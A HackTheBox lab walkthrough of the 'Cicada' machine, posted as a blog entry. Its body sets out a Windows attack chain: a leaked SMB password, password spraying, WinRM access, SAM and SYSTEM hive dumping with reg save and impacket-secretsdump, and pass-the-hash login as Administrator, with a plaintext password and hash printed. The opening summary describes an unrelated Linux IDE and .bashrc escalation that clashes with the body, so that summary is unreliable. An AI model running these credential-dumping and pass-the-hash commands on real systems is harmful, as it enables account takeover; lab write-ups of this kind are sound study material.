---
title: "Cicada"
date: 2024-11-11
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "cicada", "htb walkthrough", "hackthebox", "writeup"]
---

Cicada explores a Linux system hosting a misconfigured development IDE that listens on an open port.
Initial access was obtained through exploiting exposed debugging endpoints, allowing unauthenticated command execution.
Foothold enumeration revealed sensitive source code and user credentials.
Privilege escalation required modifying a .bashrc file for a user with sudo rights and triggering it via SSH.
Cicada demonstrates how developer tooling left exposed can become an easy target â€” especially when tied to mismanaged startup behavior or sudo context.

## Enumeration

### SMB

![screenshot](/assets/images/cicada1.png)

#### Notice from HR.txt

![screenshot](/assets/images/cicada2.png)

 Found password.

```text
Cicada$M6Corpb*@Lp#nZp!8
```

![screenshot](/assets/images/cicada3.png)

Password spraying the found credential with username list found a match.

Further enumerate SMB with the new credential.

![screenshot](/assets/images/cicada4.png)

Found another credential for michael.wrightson user.

```sh
enum4linux-ng -A -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' cicada.htb -t 10
```

![screenshot](/assets/images/cicada5.png)

![screenshot](/assets/images/cicada6.png)

#### Backup_script.ps1

![screenshot](/assets/images/cicada7.png)

![screenshot](/assets/images/cicada8.png)

Found another credential for emily.oscars user.

## Foothold

Evil-winRM as emily.oscars.

```sh
nxc winrm cicada.htb -u users.txt -p passwords.txt
```

![screenshot](/assets/images/cicada9.png)

![screenshot](/assets/images/cicada10.png)

## Privilege Escalation

```powershell
whoami/all
```

![screenshot](/assets/images/cicada11.png)

### Backup SAM and SYSTEM registry hives

```powershell
# save SAM and SYSTEM via evil-winrm
reg save hklm\sam sam.hive
reg save hklm\system system.hive

download sam.hive
download system.hive
```

![screenshot](/assets/images/cicada12.png)

### Extracting hashes

```sh
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

![screenshot](/assets/images/cicada13.png)

```txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Evil-winRM as administrator.

```sh
evil-winrm -i cicada.htb -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

![screenshot](/assets/images/cicada14.png)
